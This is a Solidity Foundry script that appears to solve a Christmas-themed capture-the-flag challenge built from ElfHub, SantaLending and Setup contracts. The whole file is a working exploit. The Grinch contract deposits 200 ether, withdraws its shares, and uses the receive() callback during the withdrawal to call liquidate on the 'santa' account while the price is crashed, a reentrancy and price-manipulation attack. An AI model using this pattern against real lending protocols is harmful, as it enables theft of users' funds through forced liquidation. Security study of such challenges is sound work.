// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Script.sol";
import "../src/Setup.sol";
import "../src/ElfHub.sol";
import "../src/SantaLending.sol";

contract Grinch {
    ElfHub hub;
    SantaLending lending;
    address santa;

    constructor(ElfHub _hub, SantaLending _lending, address _santa) {
        hub = _hub;
        lending = _lending;
        santa = _santa;
    }

    function attack() external payable {
        uint256 amount = address(this).balance;
        

        hub.deposit{value: amount}();
        
        // (Calculating shares exactly to withdraw everything)
        uint256 shares = hub.balanceOf(address(this));
        hub.withdraw(shares);
    }

    receive() external payable {
        if (address(lending) != address(0)) {
            // Price is now crashed. Liquidate!
            lending.liquidate(santa);
        }
    }
}

contract Attack is Script {
    function run() external {
        address setupAddr = vm.envAddress("SETUP_ADDR");
        
        vm.startBroadcast();
        
        Setup setup = Setup(setupAddr);
        
        Grinch grinch = new Grinch(setup.hub(), setup.lending(), setup.santa());

        grinch.attack{value: 200 ether}();
        
        vm.stopBroadcast();
    }
}
